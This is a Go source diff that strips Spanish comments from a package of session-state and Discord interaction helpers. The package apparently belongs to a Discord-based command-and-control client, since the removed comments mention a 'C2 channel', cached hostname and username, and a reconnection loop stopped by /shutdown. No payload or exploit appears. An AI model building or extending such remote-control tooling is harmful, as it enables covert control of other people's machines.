@@ -24,11 +24,9 @@ var (
 	hostName       = "desconocido"
 	userName       = "desconocido"
 
-	// CancelRoot lo asigna main para que /shutdown corte el loop de reconexión.
 	CancelRoot context.CancelFunc
 )
 
-// SetSessionInfo sincroniza los datos de la sesión activa con la capa de comandos.
 func SetSessionInfo(id string, num int, channel, host, user string) {
 	stateMu.Lock()
 	defer stateMu.Unlock()
@@ -39,35 +37,30 @@ func SetSessionInfo(id string, num int, channel, host, user string) {
 	userName = user
 }
 
-// SessionID devuelve el UUID corto de esta instancia.
 func SessionID() string {
 	stateMu.RLock()
 	defer stateMu.RUnlock()
 	return sessionID
 }
 
-// SessionNumber devuelve el número de sesión asignado.
 func SessionNumber() int {
 	stateMu.RLock()
 	defer stateMu.RUnlock()
 	return sessionNum
 }
 
-// SessionChannel devuelve el canal C2 de esta instancia.
 func SessionChannel() string {
 	stateMu.RLock()
 	defer stateMu.RUnlock()
 	return sessionChannel
 }
 
-// Hostname devuelve el hostname cacheado al crear la sesión.
 func Hostname() string {
 	stateMu.RLock()
 	defer stateMu.RUnlock()
 	return hostName
 }
 
-// Username devuelve el usuario cacheado al crear la sesión.
 func Username() string {
 	stateMu.RLock()
 	defer stateMu.RUnlock()
@@ -88,7 +81,6 @@ func webhookFields(extra ...util.EmbedField) []util.EmbedField {
 	return append(fields, extra...)
 }
 
-// Defer acusa recibo de la interacción antes de ejecutar trabajo pesado.
 func Defer(s *discordgo.Session, i *discordgo.InteractionCreate) error {
 	return s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 		Type: discordgo.InteractionResponseDeferredChannelMessageWithSource,
@@ -96,7 +88,6 @@ func Defer(s *discordgo.Session, i *discordgo.InteractionCreate) error {
 	})
 }
 
-// Reply responde sin diferir, para acciones que deben contestar y salir.
 func Reply(s *discordgo.Session, i *discordgo.InteractionCreate, content string) error {
 	return s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 		Type: discordgo.InteractionResponseChannelMessageWithSource,
@@ -104,7 +95,6 @@ func Reply(s *discordgo.Session, i *discordgo.InteractionCreate, content string)
 	})
 }
 
-// Finish edita la respuesta diferida y manda el resto en cadena si hace falta.
 func Finish(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
 	chunks := util.Chunk(content, 1900)
 	first := chunks[0]
@@ -119,13 +109,11 @@ func Finish(s *discordgo.Session, i *discordgo.InteractionCreate, content string
 	}
 }
 
-// FinishEmbed edita la respuesta diferida con un embed.
 func FinishEmbed(s *discordgo.Session, i *discordgo.InteractionCreate, embed *discordgo.MessageEmbed) {
 	embeds := []*discordgo.MessageEmbed{embed}
 	_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Embeds: &embeds})
 }
 
-// FollowupChunks manda texto adicional troceado.
 func FollowupChunks(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
 	for _, chunk := range util.Chunk(content, 1900) {
 		part := chunk
@@ -135,7 +123,6 @@ func FollowupChunks(s *discordgo.Session, i *discordgo.InteractionCreate, conten
 	}
 }
 
-// StringOption lee una opción de tipo string del comando.
 func StringOption(i *discordgo.InteractionCreate, name string) string {
 	if i.Type != discordgo.InteractionApplicationCommand {
 		return ""
@@ -148,7 +135,6 @@ func StringOption(i *discordgo.InteractionCreate, name string) string {
 	return ""
 }
 
-// IntOption lee una opción de tipo entero del comando.
 func IntOption(i *discordgo.InteractionCreate, name string) int64 {
 	if i.Type != discordgo.InteractionApplicationCommand {
 		return 0
@@ -168,8 +154,6 @@ func truncate(s string, max int) string {
 	if max <= 0 {
 		return ""
 	}
-	// SafeCut no parte un rune: cortar bytes a lo bruto deja UTF-8 inválido y
-	// Discord lo pinta como caracteres de reemplazo.
 	return util.SafeCut(s, max) + "…"
 }
 
